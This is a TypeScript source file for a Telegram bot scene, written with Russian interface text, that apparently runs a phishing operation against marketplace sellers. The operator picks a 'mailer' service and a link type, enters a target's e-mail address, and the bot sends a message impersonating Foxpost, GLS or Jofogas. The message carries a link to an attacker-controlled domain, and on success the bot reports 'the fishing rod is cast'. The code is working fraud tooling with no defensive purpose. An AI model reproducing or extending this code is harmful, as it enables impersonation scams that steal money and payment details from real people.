import {Context} from "@/database/models/context";
import {Scene} from "grammy-scenes";
import {Composer, InlineKeyboard} from "grammy";
import {adsRepository, domensRepository} from "@/database";
import {deleteAllMessages} from "@/helpers/deleteAllMessages";
import {
    preSendEmailDepa,
    preSendEmailGOSU,
    sendEmailAnafema,
    sendEmailKeshMail,
    sendEmailYourMailer
} from "@/utils/rassilka/email";
import {getDomen} from "@/helpers/getDomen";
import console from "console";

export const scene = new Scene<Context>('emailSendEtsy')
export const composer = new Composer<Context>()
const regex = /email etsy (?<id>\d+)/gmi
composer.callbackQuery(regex, handler)

async function handler(ctx: Context)  {
    const match = regex.exec(ctx.callbackQuery.data)
    const id = match.groups.id
    await ctx.scenes.enter('emailSendEtsy', {
        id
    })
}

async function cancel(ctx) {
    await deleteAllMessages(ctx.session.deleteMessage, ctx)
    ctx.scene.exit()
}

scene.always().callbackQuery('cancel emailSendEtsy', cancel)

scene.do(async (ctx) => {
    ctx.session.smsEmail = {ad: Number(ctx.scene.opts.arg.id), to: undefined, pattern: undefined}
    const ad = await adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    })
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }
    const msg = await ctx.reply("<b>Выбери мейлера:</b>", {
        reply_markup:  new InlineKeyboard()
            .text('GOSU | 5%', 'gosu')
            .row()
            .text('Отмена', 'cancel emailSendEtsy')
    })
    ctx.session.deleteMessage = [msg.message_id]
    ctx.scene.resume()
})

scene.wait().callbackQuery(/gosu/,async (ctx) => {
    ctx.session.smsEmail.who = ctx.callbackQuery.data
    try {
        ctx.deleteMessage()
    }catch (e) {}

    const ad = await adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    })
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }

    const keyb = new InlineKeyboard()

    keyb.text('LINK 2.0', 'link20')
    keyb.row()
    keyb.text('VERIFY', 'verify')
    keyb.row()
    keyb.text('Отмена', 'cancel emailSendEtsy')

    const msg = await ctx.reply("<b>🪤 Выбери линк:</b>", {
        reply_markup:  keyb
    })

    ctx.session.deleteMessage.push(msg.message_id)
    ctx.scene.resume()
})


scene.wait().callbackQuery(/verify|link20/,async (ctx) => {
    ctx.session.smsEmail.service = ctx.callbackQuery.data

    try {
        ctx.deleteMessage()
    }catch (e) {}

    const ad = await adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    })
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }

    const msg = await ctx.reply("<b>📨 Введи e-mail:</b>", {
        reply_markup:  new InlineKeyboard()
            .text('Отмена', 'cancel emailSendEtsy')
    })
    ctx.session.deleteMessage.push(msg.message_id)
    ctx.scene.resume()
})


scene.wait().on('message:text', async ctx => {
    ctx.session.smsEmail.to = ctx.msg.text
    ctx.session.deleteMessage.push(ctx.msg.message_id)

    const ad = await adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    })
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }

    if (ctx.session.smsEmail.service === 'foxpost') ctx.session.smsEmail.pattern = "FOXPOST_HU@!!@eu"
    if (ctx.session.smsEmail.service === 'gls') ctx.session.smsEmail.pattern = "GLS_HU@!!@eu"
    if (ctx.session.smsEmail.service === 'jofogas') ctx.session.smsEmail.pattern = "Jofogas_HU@!!@eu"

    const domen = await getDomen(ctx.user,ad.service)

    if (!domen) {
        await ctx.reply(`domen undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }
    const msg = await ctx.reply(`⏳`)
    if (ctx.session.smsEmail.who === 'gosu') {
        let verify = (ctx.session.smsEmail.service === 'verify')
        await preSendEmailGOSU(ctx,ad,domen,msg,ad.service,ad.country,String( (ctx.from?.username) ? ctx.from?.username : 'none'),verify)
    }
    if (ctx.session.smsEmail.who === 'yourmailer') {
        const response = await sendEmailYourMailer(
            ctx.session.smsEmail.to,
            ctx.session.smsEmail.pattern,
            `https://${domen.link}/${(ctx.session.smsEmail.service === "gls" || ctx.session.smsEmail.service === "foxpost") ? 'service/' + ctx.session.smsEmail.service : 'link/'}${ad.link}/yourmailer`,
            ctx.from.id)
        try {
            ctx.api.deleteMessage(ctx.chat.id,msg.message_id)
        } catch (e) {}

        console.log(response, 'yourmailer')
        await ctx.reply(
            (response === "The message has been sent")
                ? `✅ Удочка закинута`
                : `⚠️ Не удалось отправить письмо`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                    ]
                }
            })
    } else if (ctx.session.smsEmail.who === 'keshmail') {
        let service = undefined
        if (ad.service.toLowerCase() === 'foxpost' && ad.country.toLowerCase() === 'hu') service = "foxpost.hu"
        if (ad.service.toLowerCase() === 'gls' && ad.country.toLowerCase() === 'hu') service = "gls.hu"
        if (ad.service.toLowerCase() === 'jofogas' && ad.country.toLowerCase() === 'hu') service = "jofogas.hu"

        const response = await sendEmailKeshMail(
            String(ctx.from.id),
            String( (ctx.from?.username) ? ctx.from?.username : 'none'),
            ctx.session.smsEmail.to,
            `https://${domen.link}/${(ctx.session.smsEmail.service === "gls" || ctx.session.smsEmail.service === "foxpost") ? 'service/' + ctx.session.smsEmail.service : 'link/'}${ad.link}?email=${ctx.session.smsEmail.to}&emailowner=${ctx.session.smsEmail.who}`,
            service,
            ad.date)
        try {
            ctx.api.deleteMessage(ctx.chat.id,msg.message_id)
        } catch (e) {}
        console.log(response, 'keshmail')
        await ctx.reply(
            (response)
                ? `✅ Удочка закинута`
                : `⚠️ Не удалось отправить письмо`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                    ]
                }
            })
     }else if (ctx.session.smsEmail.who === 'anafema') {
        let service = undefined
        if (ctx.session.smsEmail.service === 'foxpost') ctx.session.smsEmail.pattern = "146"
        if (ctx.session.smsEmail.service === 'gls') ctx.session.smsEmail.pattern = "314"
        if (ctx.session.smsEmail.service === 'jofogas') ctx.session.smsEmail.pattern = "76"

        const response = await sendEmailAnafema(
            String(ctx.from.id),
            String((ctx.from?.username) ? ctx.from?.username : 'none'),
            ctx.session.smsEmail.to,
            `https://${domen.link}/${(ctx.session.smsEmail.service === "gls" || ctx.session.smsEmail.service === "foxpost") ? 'service/' + ctx.session.smsEmail.service + '/' : 'link/'}${ad.link}?email=${ctx.session.smsEmail.to}&emailowner=${ctx.session.smsEmail.who}`,
            Number(ctx.session.smsEmail.pattern),
            ad.date)
        try {
            ctx.api.deleteMessage(ctx.chat.id,msg.message_id)
        } catch (e) {}
        console.log(response, 'anafema')
        await ctx.reply(
            (response)
                ? `✅ Удочка закинута`
                : `⚠️ Не удалось отправить письмо`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                    ]
                }
            })
    } else if (ctx.session.smsEmail.who === 'depa') {
        await preSendEmailDepa(ctx,ad,domen,msg,ctx.session.smsEmail.service)
    }



    return cancel(ctx)
})